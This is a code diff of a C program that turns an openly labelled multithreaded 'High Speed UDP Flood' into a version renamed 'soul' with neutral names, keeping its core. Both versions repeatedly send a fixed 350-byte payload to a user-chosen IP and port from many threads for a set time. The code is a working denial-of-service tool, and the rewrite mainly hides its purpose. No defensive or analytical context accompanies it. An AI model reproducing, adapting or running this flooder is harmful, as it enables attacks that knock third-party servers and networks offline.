@@ -2,18 +2,29 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <pthread.h>
 #include <arpa/inet.h>
-#include <sys/socket.h>
-#include <netinet/ip.h>
-#include <netinet/udp.h>
+#include <pthread.h>
 #include <time.h>
+#include <sys/socket.h>
 
-#define PAYLOAD_SIZE 350
-#define MAX_THREADS 64
+void show_usage() {
+    printf("Usage: ./soul ip port time data\n");
+    exit(1);
+}
 
-// 700 character (350 bytes) payload
-unsigned char payload[PAYLOAD_SIZE] = {
+typedef struct {
+    char *target;
+    int port;
+    int duration;
+} config;
+
+void *task(void *arg) {
+    config *c = (config *)arg;
+    int s;
+    struct sockaddr_in addr;
+    time_t end;
+    
+    unsigned char play[] = {
     0xA6,0x4D,0x02,0xD9,0xBB,0xA6,0x7C,0x8F,0x76,0x21,0x99,0x20,0xA2,0x5F,0x54,0x7A,
     0xC9,0x1B,0x86,0x74,0xB0,0x62,0x8E,0xD5,0x6B,0x21,0xA6,0xFD,0xEA,0x99,0x45,0x1C,
     0x3E,0x62,0xD9,0x0F,0x36,0xFA,0x44,0xC7,0xF0,0x80,0x4C,0x29,0x6B,0x4D,0x9D,0xDC,
@@ -36,81 +47,49 @@ unsigned char payload[PAYLOAD_SIZE] = {
     0xB6,0x04,0xF2,0x48,0xD0,0xE1,0xE2,0xDA,0x87,0x11,0x0D,0x54,0xE0,0x64,0xC2,0x20,
     0xC3,0x05,0x29,0xE3,0xB0,0x1E,0x95,0xDB,0x80,0x0C,0x8E,0x02,0x26,0xA8,0xC1,0xD8,
     0x6E,0x08,0x63,0x91,0xC2,0x25,0x47,0x5B,0x2F,0x9B,0xCC,0x40,0x77,0xAB
-};
-
-struct thread_data {
-    char ip[32];
-    int port;
-    int duration;
-};
-
-void *flood(void *arg) {
-    struct thread_data *data = (struct thread_data *)arg;
-    struct sockaddr_in target;
-    int sock;
-    time_t endtime;
-
-    sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
-    if (sock < 0) {
-        perror("Raw socket creation failed (run as root)");
-        return NULL;
+    };
+    
+    s = socket(AF_INET, SOCK_DGRAM, 0);
+    if (s < 0) pthread_exit(NULL);
+    
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(c->port);
+    addr.sin_addr.s_addr = inet_addr(c->target);
+    
+    end = time(NULL) + c->duration;
+    
+    while (time(NULL) <= end) {
+        sendto(s, play, sizeof(play), 0, (struct sockaddr*)&addr, sizeof(addr));
+        usleep(500);
     }
-
-    memset(&target, 0, sizeof(target));
-    target.sin_family = AF_INET;
-    target.sin_port = htons(data->port);
-    inet_pton(AF_INET, data->ip, &target.sin_addr);
-
-    endtime = time(NULL) + data->duration;
-
-    while (time(NULL) < endtime) {
-        sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
-        // No sleep - maximum speed
-    }
-
-    close(sock);
-    return NULL;
+    
+    close(s);
+    pthread_exit(NULL);
 }
 
-int main(int argc, char *argv[]) {
-    if (argc != 5) {
-        printf("Usage: ./pay <IP> <PORT> <TIME_seconds> <THREADS>\n");
-        printf("Example: sudo ./pay 192.168.1.100 12345 30 32\n");
-        printf("Note: Run with sudo for raw socket\n");
-        return 1;
-    }
-
+int main(int argc, char **argv) {
+    if (argc != 5) show_usage();
+    
     char *ip = argv[1];
-    int port = atoi(argv[2]);
-    int duration = atoi(argv[3]);
-    int threads = atoi(argv[4]);
-
-    if (threads > MAX_THREADS) threads = MAX_THREADS;
-
-    printf("[+] High Speed UDP Flood Started (Target \~4M PPS)\n");
-    printf("Target     : %s:%d\n", ip, port);
-    printf("Duration   : %d seconds\n", duration);
-    printf("Threads    : %d\n", threads);
-    printf("Payload    : 350 bytes\n");
-    printf("Warning    : Run with sudo!\n\n");
-
-    pthread_t thread_ids[MAX_THREADS];
-    struct thread_data tdata[MAX_THREADS];
-
-    for (int i = 0; i < threads; i++) {
-        strncpy(tdata[i].ip, ip, 31);
-        tdata[i].port = port;
-        tdata[i].duration = duration;
-
-        if (pthread_create(&thread_ids[i], NULL, flood, &tdata[i]) != 0) {
-            perror("Thread creation failed");
-        }
+    int p = atoi(argv[2]);
+    int t = atoi(argv[3]);
+    int th = atoi(argv[4]);
+    
+    pthread_t *tids = malloc(th * sizeof(pthread_t));
+    config cfg = {ip, p, t};
+    
+    printf("soul started: %s:%d %ds %d data\n", ip, p, t, th);
+    
+    for (int i = 0; i < th; i++) {
+        pthread_create(&tids[i], NULL, task, &cfg);
     }
-
-    for (int i = 0; i < threads; i++) {
-        pthread_join(thread_ids[i], NULL);
+    
+    for (int i = 0; i < th; i++) {
+        pthread_join(tids[i], NULL);
     }
-
-    printf("[+] Attack Finished\n");
+    
+    free(tids);
+    printf("soul finished\n");
     return 0;
 }
